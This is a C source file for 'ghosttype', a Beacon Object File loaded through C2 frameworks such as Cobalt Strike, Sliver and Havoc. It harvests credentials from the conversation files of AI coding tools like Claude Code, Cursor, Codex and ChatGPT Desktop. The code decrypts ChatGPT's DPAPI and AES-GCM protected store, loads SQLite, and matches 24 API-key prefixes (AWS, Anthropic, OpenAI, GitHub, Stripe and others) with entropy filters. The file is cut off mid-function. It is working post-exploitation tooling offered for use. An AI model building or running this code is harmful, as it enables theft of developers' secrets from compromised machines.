/*
 * ghosttype.c - AI coding tool credential scanner (BOF)
 *
 * Scans Claude Code CLI, Cursor IDE, Codex CLI, ChatGPT Desktop, and
 * Claude Desktop conversation files for exposed credentials using 24
 * prefix-based matchers, 7 structure matchers, and 10 heuristic
 * context-signal matchers with entropy filtering.
 *
 * Portable BOF compatible with any COFF-loader C2 framework:
 * Cobalt Strike, Sliver, Mythic, Havoc, Brute Ratel, etc.
 *
 * Arguments (packed as BOF args):
 *   i:cmd              0=scan_all 1=claude_code 2=cursor 3=codex 4=chatgpt 5=list_tools
 *   i:max_age_days     0=all files, N=only files modified within last N days
 *   i:redact           0=full output, 1=mask credential values
 *   i:min_confidence   0=medium+high, 1=high only
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -c -O2 -Wall -Wextra -Werror -fno-builtin -o ghosttype.o ghosttype.c
 *
 * Usage (Cobalt Strike):
 *   inline-execute ghosttype.o i:0 i:7 i:0 i:0     # All tools, last 7 days
 *   inline-execute ghosttype.o i:1 i:0 i:1 i:1     # Claude Code, redacted, high only
 *   inline-execute ghosttype.o i:5 i:0 i:0 i:0     # List detected tools
 *
 * Output format: NDJSON (one JSON object per finding, one summary object).
 */
#include <windows.h>
#include "beacon.h"

/* ================================================================
 * DFR Declarations
 * ================================================================ */

/* KERNEL32 */
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$CreateFileW(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$FindFirstFileW(LPCWSTR, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindNextFileW(HANDLE, LPWIN32_FIND_DATAW);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FindClose(HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileAttributesW(LPCWSTR);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetEnvironmentVariableW(LPCWSTR, LPWSTR, DWORD);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTempPathW(DWORD, LPWSTR);
DECLSPEC_IMPORT UINT    WINAPI KERNEL32$GetTempFileNameW(LPCWSTR, LPCWSTR, UINT, LPWSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CopyFileW(LPCWSTR, LPCWSTR, BOOL);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$DeleteFileW(LPCWSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$FreeLibrary(HMODULE);
DECLSPEC_IMPORT void    WINAPI KERNEL32$GetSystemTimeAsFileTime(LPFILETIME);
DECLSPEC_IMPORT int     WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int     WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT int     WINAPI KERNEL32$lstrlenW(LPCWSTR);
DECLSPEC_IMPORT void    WINAPI KERNEL32$RtlZeroMemory(PVOID, SIZE_T);
DECLSPEC_IMPORT HLOCAL  WINAPI KERNEL32$LocalFree(HLOCAL);

/* CRYPT32 DPAPI */
DECLSPEC_IMPORT BOOL WINAPI CRYPT32$CryptUnprotectData(
    DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);

/* BCRYPT AES-GCM */
typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;
DECLSPEC_IMPORT LONG WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);
DECLSPEC_IMPORT LONG WINAPI BCRYPT$BCryptSetProperty(BCRYPT_ALG_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT LONG WINAPI BCRYPT$BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);
DECLSPEC_IMPORT LONG WINAPI BCRYPT$BCryptDecrypt(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PVOID, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);
DECLSPEC_IMPORT LONG WINAPI BCRYPT$BCryptDestroyKey(BCRYPT_KEY_HANDLE);
DECLSPEC_IMPORT LONG WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE, ULONG);

/* ================================================================
 * Constants and Types
 * ================================================================ */

#define MAX_FPATH       520
#define MAX_FILE_SIZE   (5 * 1024 * 1024)
#define MAX_FINDINGS    200
#define MAX_FILES_TOOL  50
#define SEEN_BUF_SIZE   32768
#define GCM_NONCE_LEN   12
#define GCM_TAG_LEN     16

typedef struct {
    ULONG  cbSize;
    ULONG  dwInfoVersion;
    PUCHAR pbNonce;
    ULONG  cbNonce;
    PUCHAR pbAuthData;
    ULONG  cbAuthData;
    PUCHAR pbTag;
    ULONG  cbTag;
    PUCHAR pbMacContext;
    ULONG  cbMacContext;
    ULONG  cbAAD;
    ULONGLONG cbData;
    ULONG  dwFlags;
} GCM_AUTH_INFO;

typedef struct {
    int       max_age_days;
    int       redact;
    int       high_only;
    int       findings;
    int       files_scanned;
    ULONGLONG cutoff_ft;
} scan_ctx_t;

/* SQLite function pointers */
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
typedef int  (*fn_sqlite3_open_v2)(const char*, sqlite3**, int, const char*);
typedef int  (*fn_sqlite3_prepare_v2)(sqlite3*, const char*, int, sqlite3_stmt**, const char**);
typedef int  (*fn_sqlite3_step)(sqlite3_stmt*);
typedef const unsigned char* (*fn_sqlite3_column_text)(sqlite3_stmt*, int);
typedef int  (*fn_sqlite3_finalize)(sqlite3_stmt*);
typedef int  (*fn_sqlite3_close)(sqlite3*);

#define SQLITE_OK   0
#define SQLITE_ROW  100
#define SQLITE_OPEN_READONLY 0x00000001
#define SQLITE_OPEN_NOMUTEX  0x00008000

typedef struct {
    fn_sqlite3_open_v2    open_v2;
    fn_sqlite3_prepare_v2 prepare_v2;
    fn_sqlite3_step       step;
    fn_sqlite3_column_text column_text;
    fn_sqlite3_finalize   finalize;
    fn_sqlite3_close      close;
} sqlite_fns_t;

/* Dedup buffer */
static char  g_seen[SEEN_BUF_SIZE];
static int   g_seen_pos = 0;

/* ================================================================
 * String and Memory Helpers
 * ================================================================ */

static int slen(const char *s) {
    int i = 0; while (s[i]) i++; return i;
}

static void scpy(char *d, int dsz, const char *s) {
    int i = 0;
    while (s[i] && i < dsz - 1) { d[i] = s[i]; i++; }
    d[i] = '\0';
}


static int scmp(const char *a, const char *b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static void smemcpy(void *d, const void *s, int n) {
    char *dd = (char*)d; const char *ss = (const char*)s;
    for (int i = 0; i < n; i++) dd[i] = ss[i];
}

static void smemset(void *d, int v, int n) {
    char *dd = (char*)d;
    for (int i = 0; i < n; i++) dd[i] = (char)v;
}

static char to_lower(char c) {
    return (c >= 'A' && c <= 'Z') ? (char)(c + 32) : c;
}

static int scmp_nocase(const char *a, const char *b, int n) {
    for (int i = 0; i < n; i++) {
        char ca = to_lower(a[i]), cb = to_lower(b[i]);
        if (ca != cb) return ca - cb;
        if (!ca) return 0;
    }
    return 0;
}


static void wcat(wchar_t *buf, int cap, const wchar_t *src, int *pos) {
    while (*src && *pos < cap - 1) buf[(*pos)++] = *src++;
    buf[*pos] = 0;
}


static void n_from_wide(const wchar_t *w, char *n, int nsz) {
    KERNEL32$WideCharToMultiByte(65001, 0, w, -1, n, nsz, NULL, NULL);
}

static int json_escape(const char *src, char *dst, int dsz) {
    int i = 0, j = 0;
    while (src[i] && j < dsz - 2) {
        char c = src[i];
        if (c == '\\' || c == '"') { dst[j++] = '\\'; dst[j++] = c; }
        else if (c == '\n') { dst[j++] = '\\'; dst[j++] = 'n'; }
        else if (c == '\r') { dst[j++] = '\\'; dst[j++] = 'r'; }
        else if (c == '\t') { dst[j++] = '\\'; dst[j++] = 't'; }
        else dst[j++] = c;
        i++;
    }
    dst[j] = '\0';
    return j;
}

/* ================================================================
 * File I/O
 * ================================================================ */

static unsigned char* read_file_w(const wchar_t *path, DWORD max_size, DWORD *out_size) {
    *out_size = 0;
    HANDLE hf = KERNEL32$CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                                      NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return NULL;

    DWORD fsz = KERNEL32$GetFileSize(hf, NULL);
    if (fsz == INVALID_FILE_SIZE || fsz == 0 || fsz > max_size) {
        KERNEL32$CloseHandle(hf);
        return NULL;
    }

    HANDLE heap = KERNEL32$GetProcessHeap();
    unsigned char *buf = (unsigned char*)KERNEL32$HeapAlloc(heap, 0, fsz + 1);
    if (!buf) { KERNEL32$CloseHandle(hf); return NULL; }

    DWORD total = 0;
    while (total < fsz) {
        DWORD rd = 0;
        if (!KERNEL32$ReadFile(hf, buf + total, fsz - total, &rd, NULL) || rd == 0) break;
        total += rd;
    }
    buf[total] = 0;
    KERNEL32$CloseHandle(hf);
    *out_size = total;
    return buf;
}

static int dir_exists(const wchar_t *path) {
    DWORD attr = KERNEL32$GetFileAttributesW(path);
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

static int file_is_recent(FILETIME *ft, ULONGLONG cutoff) {
    if (cutoff == 0) return 1;
    ULARGE_INTEGER u;
    u.LowPart = ft->dwLowDateTime;
    u.HighPart = ft->dwHighDateTime;
    return u.QuadPart >= cutoff;
}

typedef void (*walk_cb_t)(const wchar_t *path, WIN32_FIND_DATAW *fd, void *user);

static void walk_files(const wchar_t *dir, const wchar_t *pattern,
                        int recurse, walk_cb_t cb, void *user, int *count, int maxcount) {
    if (*count >= maxcount) return;

    wchar_t search[MAX_FPATH];
    int pos = 0;
    wcat(search, MAX_FPATH, dir, &pos);
    wcat(search, MAX_FPATH, L"\\", &pos);
    wcat(search, MAX_FPATH, pattern, &pos);

    WIN32_FIND_DATAW fd;
    HANDLE hf = KERNEL32$FindFirstFileW(search, &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        do {
            if (*count >= maxcount) break;
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                wchar_t full[MAX_FPATH];
                int fp = 0;
                wcat(full, MAX_FPATH, dir, &fp);
                wcat(full, MAX_FPATH, L"\\", &fp);
                wcat(full, MAX_FPATH, fd.cFileName, &fp);
                cb(full, &fd, user);
                (*count)++;
            }
        } while (KERNEL32$FindNextFileW(hf, &fd));
        KERNEL32$FindClose(hf);
    }

    if (!recurse) return;

    pos = 0;
    wcat(search, MAX_FPATH, dir, &pos);
    wcat(search, MAX_FPATH, L"\\*", &pos);

    hf = KERNEL32$FindFirstFileW(search, &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        do {
            if (*count >= maxcount) break;
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
                fd.cFileName[0] != L'.') {
                wchar_t sub[MAX_FPATH];
                int sp = 0;
                wcat(sub, MAX_FPATH, dir, &sp);
                wcat(sub, MAX_FPATH, L"\\", &sp);
                wcat(sub, MAX_FPATH, fd.cFileName, &sp);
                walk_files(sub, pattern, 1, cb, user, count, maxcount);
            }
        } while (KERNEL32$FindNextFileW(hf, &fd));
        KERNEL32$FindClose(hf);
    }
}

/* ================================================================
 * Minimal JSON Helpers
 * ================================================================ */

static const char* jfind_key(const char *json, int jlen, const char *key) {
    int klen = slen(key);
    for (int i = 0; i < jlen - klen - 2; i++) {
        if (json[i] != '"') continue;
        int ok = 1;
        for (int k = 0; k < klen; k++) {
            if (json[i + 1 + k] != key[k]) { ok = 0; break; }
        }
        if (!ok || json[i + 1 + klen] != '"') continue;
        int j = i + 1 + klen + 1;
        while (j < jlen && (json[j] == ' ' || json[j] == '\t' || json[j] == '\n' || json[j] == '\r')) j++;
        if (j < jlen && json[j] == ':') {
            j++;
            while (j < jlen && (json[j] == ' ' || json[j] == '\t' || json[j] == '\n' || json[j] == '\r')) j++;
            return json + j;
        }
    }
    return NULL;
}

static int jread_str(const char *p, char *out, int osz) {
    if (!p || *p != '"') { if (osz > 0) out[0] = '\0'; return 0; }
    p++;
    int i = 0;
    while (*p && *p != '"' && i < osz - 1) {
        if (*p == '\\') {
            p++;
            if (!*p) break;
            switch (*p) {
                case 'n': out[i++] = '\n'; break;
                case 't': out[i++] = '\t'; break;
                case 'r': out[i++] = '\r'; break;
                case '"': out[i++] = '"'; break;
                case '\\': out[i++] = '\\'; break;
                case '/': out[i++] = '/'; break;
                default: out[i++] = *p; break;
            }
        } else {
            out[i++] = *p;
        }
        p++;
    }
    out[i] = '\0';
    return i;
}

static int jstr_eq(const char *p, const char *val) {
    if (!p || *p != '"') return 0;
    p++;
    while (*val && *p == *val) { p++; val++; }
    return (*val == '\0' && *p == '"');
}

/* ================================================================
 * Base64 Decoder
 * ================================================================ */

static const unsigned char B64T[256] = {
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255, 62,255,255,255, 63,
     52, 53, 54, 55, 56, 57, 58, 59, 60, 61,255,255,255,  0,255,255,
    255,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,
     15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,255,255,255,255,255,
    255, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
     41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
    255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,255,
};

static int b64_decode(const char *src, int src_len, unsigned char *dst, int dst_cap) {
    int out = 0;
    unsigned int acc = 0;
    int bits = 0;
    for (int i = 0; i < src_len && out < dst_cap; i++) {
        unsigned char c = (unsigned char)src[i];
        if (c == '=' || c == '\n' || c == '\r' || c == ' ') continue;
        unsigned char v = B64T[c];
        if (v == 255) continue;
        acc = (acc << 6) | v;
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            dst[out++] = (unsigned char)((acc >> bits) & 0xFF);
        }
    }
    return out;
}

/* ================================================================
 * SQLite Dynamic Loader
 * ================================================================ */

static HMODULE g_sqlite_mod = NULL;
static sqlite_fns_t g_sq;

static int sqlite_load(void) {
    if (g_sqlite_mod) return 1;
    g_sqlite_mod = KERNEL32$LoadLibraryA("winsqlite3.dll");
    if (!g_sqlite_mod) return 0;

    void *p;
    p = (void*)(ULONG_PTR)KERNEL32$GetProcAddress(g_sqlite_mod, "sqlite3_open_v2");
    g_sq.open_v2 = (fn_sqlite3_open_v2)p;
    p = (void*)(ULONG_PTR)KERNEL32$GetProcAddress(g_sqlite_mod, "sqlite3_prepare_v2");
    g_sq.prepare_v2 = (fn_sqlite3_prepare_v2)p;
    p = (void*)(ULONG_PTR)KERNEL32$GetProcAddress(g_sqlite_mod, "sqlite3_step");
    g_sq.step = (fn_sqlite3_step)p;
    p = (void*)(ULONG_PTR)KERNEL32$GetProcAddress(g_sqlite_mod, "sqlite3_column_text");
    g_sq.column_text = (fn_sqlite3_column_text)p;
    p = (void*)(ULONG_PTR)KERNEL32$GetProcAddress(g_sqlite_mod, "sqlite3_finalize");
    g_sq.finalize = (fn_sqlite3_finalize)p;
    p = (void*)(ULONG_PTR)KERNEL32$GetProcAddress(g_sqlite_mod, "sqlite3_close");
    g_sq.close = (fn_sqlite3_close)p;

    if (!g_sq.open_v2 || !g_sq.prepare_v2 || !g_sq.step ||
        !g_sq.column_text || !g_sq.finalize || !g_sq.close) {
        KERNEL32$FreeLibrary(g_sqlite_mod);
        g_sqlite_mod = NULL;
        return 0;
    }
    return 1;
}

static void sqlite_unload(void) {
    if (g_sqlite_mod) {
        KERNEL32$FreeLibrary(g_sqlite_mod);
        g_sqlite_mod = NULL;
    }
}

static int copy_to_temp(const wchar_t *src, wchar_t *tmp_path) {
    wchar_t tmp_dir[MAX_FPATH];
    KERNEL32$GetTempPathW(MAX_FPATH, tmp_dir);
    KERNEL32$GetTempFileNameW(tmp_dir, L"gt", 0, tmp_path);
    return KERNEL32$CopyFileW(src, tmp_path, FALSE);
}

/* ================================================================
 * DPAPI + AES-GCM Decryption (ChatGPT)
 * ================================================================ */

static unsigned char* dpapi_decrypt_key(const char *json, int jlen,
                                         DWORD *key_len_out) {
    *key_len_out = 0;
    const char *needle = "\"encrypted_key\":\"";
    int nlen = 17;
    const char *ks = NULL;
    for (int i = 0; i < jlen - nlen; i++) {
        int ok = 1;
        for (int j = 0; j < nlen; j++) {
            if (json[i + j] != needle[j]) { ok = 0; break; }
        }
        if (ok) { ks = json + i + nlen; break; }
    }
    if (!ks) return NULL;

    const char *ke = ks;
    while (*ke && *ke != '"') ke++;
    if (ke <= ks) return NULL;
    int b64len = (int)(ke - ks);

    HANDLE heap = KERNEL32$GetProcessHeap();
    unsigned char *decoded = (unsigned char*)KERNEL32$HeapAlloc(heap, 0, b64len + 4);
    if (!decoded) return NULL;
    int dlen = b64_decode(ks, b64len, decoded, b64len);

    if (dlen <= 5) {
        KERNEL32$HeapFree(heap, 0, decoded);
        return NULL;
    }

    DATA_BLOB in_blob, out_blob;
    in_blob.cbData = dlen - 5;
    in_blob.pbData = decoded + 5;
    out_blob.cbData = 0;
    out_blob.pbData = NULL;

    BOOL ok = CRYPT32$CryptUnprotectData(&in_blob, NULL, NULL, NULL, NULL, 0, &out_blob);
    KERNEL32$HeapFree(heap, 0, decoded);

    if (!ok || !out_blob.pbData || out_blob.cbData == 0) return NULL;

    *key_len_out = out_blob.cbData;
    return out_blob.pbData;
}

static unsigned char* gcm_decrypt(const unsigned char *master_key, DWORD key_len,
                                    const unsigned char *blob, int blob_len,
                                    int *out_len) {
    *out_len = 0;
    if (blob_len < 3 + GCM_NONCE_LEN + 1 + GCM_TAG_LEN) return NULL;
    if (blob[0] != 'v' || blob[1] != '1' || (blob[2] != '0' && blob[2] != '1'))
        return NULL;

    const unsigned char *nonce = blob + 3;
    const unsigned char *ct    = blob + 3 + GCM_NONCE_LEN;
    int ct_tag_len = blob_len - 3 - GCM_NONCE_LEN;
    int ct_len     = ct_tag_len - GCM_TAG_LEN;
    const unsigned char *tag   = blob + blob_len - GCM_TAG_LEN;
    if (ct_len <= 0) return NULL;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;

    if (BCRYPT$BCryptOpenAlgorithmProvider(&hAlg, L"AES", NULL, 0) != 0)
        return NULL;
    if (BCRYPT$BCryptSetProperty(hAlg, L"ChainingMode",
            (PUCHAR)L"ChainingModeGCM", 34, 0) != 0) {
        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    unsigned char key_obj[1024];
    if (BCRYPT$BCryptGenerateSymmetricKey(hAlg, &hKey, key_obj, sizeof(key_obj),
            (PUCHAR)master_key, key_len, 0) != 0) {
        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    GCM_AUTH_INFO ai;
    KERNEL32$RtlZeroMemory(&ai, sizeof(ai));
    ai.cbSize       = sizeof(ai);
    ai.dwInfoVersion = 1;
    ai.pbNonce      = (PUCHAR)nonce;
    ai.cbNonce      = GCM_NONCE_LEN;
    ai.pbTag        = (PUCHAR)tag;
    ai.cbTag        = GCM_TAG_LEN;

    HANDLE heap = KERNEL32$GetProcessHeap();
    unsigned char *pt = (unsigned char*)KERNEL32$HeapAlloc(heap, 0, ct_len + 1);
    if (!pt) {
        BCRYPT$BCryptDestroyKey(hKey);
        BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);
        return NULL;
    }

    ULONG plen = 0;
    LONG status = BCRYPT$BCryptDecrypt(hKey, (PUCHAR)ct, (ULONG)ct_len,
                                        &ai, NULL, 0, pt, (ULONG)ct_len, &plen, 0);
    BCRYPT$BCryptDestroyKey(hKey);
    BCRYPT$BCryptCloseAlgorithmProvider(hAlg, 0);

    if (status != 0) {
        KERNEL32$HeapFree(heap, 0, pt);
        return NULL;
    }
    pt[plen] = 0;
    *out_len = (int)plen;
    return pt;
}

/* ================================================================
 * Pattern Engine
 * ================================================================ */

/* Character set validators */
static int is_upper_alnum(char c) {
    return (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9');
}
static int is_alnum(char c) {
    return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9');
}
static int is_alnum_dash(char c) {
    return is_alnum(c) || c == '-' || c == '_';
}
static int is_alnum_ext(char c) {
    return is_alnum_dash(c) || c == '.' || c == '/' || c == '+';
}
static int is_nonspace(char c) {
    return c > ' ' && c != '"' && c != '\'' && c != '<' && c != '>';
}
static int is_b64url(char c) {
    return is_alnum(c) || c == '-' || c == '_';
}
static int is_digit(char c) {
    return c >= '0' && c <= '9';
}

/* Entropy check using fixed-point log2 approximation */
static int ilog2x256(unsigned int n) {
    if (n <= 1) return 0;
    int ipart = 0;
    unsigned int t = n;
    while (t > 1) { t >>= 1; ipart++; }
    unsigned int lo = 1u << ipart;
    int frac = (int)((256 * (n - lo)) / lo);
    return (ipart * 256) + frac;
}

static int entropy_above_3(const char *s, int len) {
    if (len <= 4) return 0;
    int freq[256];
    smemset(freq, 0, sizeof(freq));
    for (int i = 0; i < len; i++) freq[(unsigned char)s[i]]++;

    int nlog2n = len * ilog2x256((unsigned int)len);
    int sum_flog2f = 0;
    for (int i = 0; i < 256; i++) {
        if (freq[i] > 0)
            sum_flog2f += freq[i] * ilog2x256((unsigned int)freq[i]);
    }
    /* H*256 = (nlog2n - sum_flog2f) / len; threshold = 3.0*256 = 768 */
    return ((nlog2n - sum_flog2f) / len) >= 768;
}

/* Placeholder / example value filter */
static int starts_with_nocase(const char *s, const char *pfx) {
    while (*pfx) {
        if (to_lower(*s) != to_lower(*pfx)) return 0;
        s++; pfx++;
    }
    return 1;
}

static int is_placeholder(const char *v, int vlen) {
    if (vlen < 8) return 1;
    if (!entropy_above_3(v, vlen)) return 1;

    if (starts_with_nocase(v, "your_") || starts_with_nocase(v, "your-") ||
        starts_with_nocase(v, "yourkey") || starts_with_nocase(v, "yoursecret") ||
        starts_with_nocase(v, "insert_") || starts_with_nocase(v, "insert-") ||
        starts_with_nocase(v, "replace_") || starts_with_nocase(v, "replace-") ||
        starts_with_nocase(v, "fake_") || starts_with_nocase(v, "fake-") ||
        starts_with_nocase(v, "test_") || starts_with_nocase(v, "test-") ||
        starts_with_nocase(v, "example_") || starts_with_nocase(v, "example-") ||
        starts_with_nocase(v, "placeholder") || starts_with_nocase(v, "demo_") ||
        starts_with_nocase(v, "dummy_") || starts_with_nocase(v, "sample_"))
        return 1;

    if (v[0] == '<' || (v[vlen-1] == '>')) return 1;

    if (scmp(v, "AKIAIOSFODNN7EXAMPLE") == 0) return 1;
    if (scmp(v, "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY") == 0) return 1;
    if (scmp(v, "ASIAIOSFODNN7EXAMPLE") == 0) return 1;
    if (scmp(v, "hunter2") == 0) return 1;
    if (scmp(v, "correcthorsebatterystaple") == 0) return 1;
    if (starts_with_nocase(v, "postgresql://user:password@localhost")) return 1;
    if (starts_with_nocase(v, "mysql://user:password@localhost")) return 1;
    if (starts_with_nocase(v, "mongodb://user:password@localhost")) return 1;
    return 0;
}

/* Deduplication */
static int is_seen(const char *val) {
    const char *p = g_seen;
    int pos = 0;
    while (pos < g_seen_pos) {
        int elen = slen(p + pos);
        if (scmp(p + pos, val) == 0) return 1;
        pos += elen + 1;
    }
    return 0;
}

static void mark_seen(const char *val) {
    int vlen = slen(val);
    if (g_seen_pos + vlen + 1 >= SEEN_BUF_SIZE) return;
    scpy(g_seen + g_seen_pos, vlen + 1, val);
    g_seen_pos += vlen + 1;
}

/* ----------------------------------------------------------------
 * Prefix-based credential patterns (24 patterns)
 * ---------------------------------------------------------------- */

#define CS_UPALNUM  0
#define CS_ALNUM    1
#define CS_ALNDASH  2
#define CS_ALNEXT   3

typedef struct {
    const char *name;
    const char *prefix;
    int  plen;
    int  min_tail;
    int  max_tail;
    int  cs;
    int  critical;
} ppat_t;

static const ppat_t PPATS[] = {
    {"aws_access_key",      "AKIA",         4,  16, 16, CS_UPALNUM,  1},
    {"aws_sts_token",       "ASIA",         4,  16, 16, CS_UPALNUM,  0},
    {"anthropic_key",       "sk-ant-",      7,  20,  0, CS_ALNDASH,  1},
    {"openai_token",        "sk-proj-",     8,  20,  0, CS_ALNDASH,  0},
    {"openai_token",        "sk-",          3,  20,  0, CS_ALNDASH,  0},
    {"github_pat_classic",  "ghp_",         4,  36,  0, CS_ALNUM,    1},
    {"github_pat_fine",     "github_pat_", 11,  82, 82, CS_ALNDASH,  1},
    {"stripe_secret_key",   "sk_live_",     8,  24,  0, CS_ALNUM,    1},
    {"stripe_test_key",     "sk_test_",     8,  24,  0, CS_ALNUM,    0},
    {"sendgrid_key",        "SG.",          3,  43,  0, CS_ALNDASH,  0},
    {"github_app_token",    "ghs_",         4,  36, 36, CS_ALNUM,    1},
    {"github_user_token",   "ghu_",         4,  36, 36, CS_ALNUM,    0},
    {"linear_api_key",      "lin_api_",     8,  38, 44, CS_ALNDASH,  0},
    {"databricks_token",    "dapi",         4,  32, 32, CS_ALNUM,    0},
    {"npm_token",           "npm_",         4,  36,  0, CS_ALNUM,    0},
    {"huggingface_token",   "hf_",          3,  34,  0, CS_ALNUM,    0},
    {"digitalocean_token",  "dop_v1_",      7,  64, 64, CS_ALNUM,    0},
    {"github_oauth_token",  "gho_",         4,  36, 36, CS_ALNUM,    0},
    {"github_refresh_token","ghr_",         4,  76, 76, CS_ALNUM,    0},
    {"dockerhub_token",     "dckr_pat_",    9,  20,  0, CS_ALNDASH,  0},
    {"pulumi_token",        "pul-",         4,  40, 40, CS_ALNUM,    0},
    {"doppler_token",       "dp.st.",       6,  43, 43, CS_ALNUM,    0},
    {"pypi_token",          "pypi-",        5, 100,  0, CS_ALNDASH,  0},
    {"gcp_api_key",         "AIzaSy",       6,  33, 33, CS_ALNDASH,  0},
    {NULL, NULL, 0, 0, 0, 0, 0}
};

static int cs_check(int cs, char c) {
    switch (cs) {
        case CS_UPALNUM: return is_upper_alnum(c);
        case CS_ALNUM:   return is_alnum(c);
        case CS_ALNDASH: return is_alnum_dash(c);
        case CS_ALNEXT:  return is_alnum_ext(c);
    }
    return 0;
}

static int try_prefix_match(const char *text, int pos, int tlen,
                              const ppat_t *pat, char *val_out, int vsize) {
    if (pos + pat->plen >= tlen) return 0;
    for (int i = 0; i < pat->plen; i++) {
        if (text[pos + i] != pat->prefix[i]) return 0;
    }
    if (pos > 0 && is_alnum(text[pos - 1])) return 0;

    int tail = 0;
    int start = pos + pat->plen;
    while (start + tail < tlen && cs_check(pat->cs, text[start + tail])) tail++;
    if (tail < pat->min_tail) return 0;
    if (pat->max_tail > 0 && tail > pat->max_tail) return 0;
    if (start + tail < tlen && cs_check(pat->cs, text[start + tail])) return 0;

    int total = pat->plen + tail;
    if (total >= vsize) total = vsize - 1;
    smemcpy(val_out, text + pos, total);
    val_out[total] = '\0';
    return 1;
}

/* ----------------------------------------------------------------
 * Special-structure patterns (7 patterns)
 * ---------------------------------------------------------------- */

static int match_slack(const char *t, int p, int tlen, char *v, int vs) {
    if (p + 5 >= tlen) return 0;
    if (t[p] != 'x' || t[p+1] != 'o' || t[p+2] != 'x') return 0;
    char x = t[p+3];
    if (x != 'b' && x != 'p' && x != 'a' && x != 's') return 0;
    if (t[p+4] != '-') return 0;
    if (p > 0 && is_alnum(t[p-1])) return 0;
    int tail = 0;
    while (p + 5 + tail < tlen && is_alnum_dash(t[p + 5 + tail])) tail++;
    if (tail < 10) return 0;
    int total = 5 + tail;
    if (total >= vs) total = vs - 1;
    smemcpy(v, t + p, total); v[total] = '\0';
    return 1;
}

static int match_vault(const char *t, int p, int tlen, char *v, int vs) {
    if (p + 5 >= tlen) return 0;
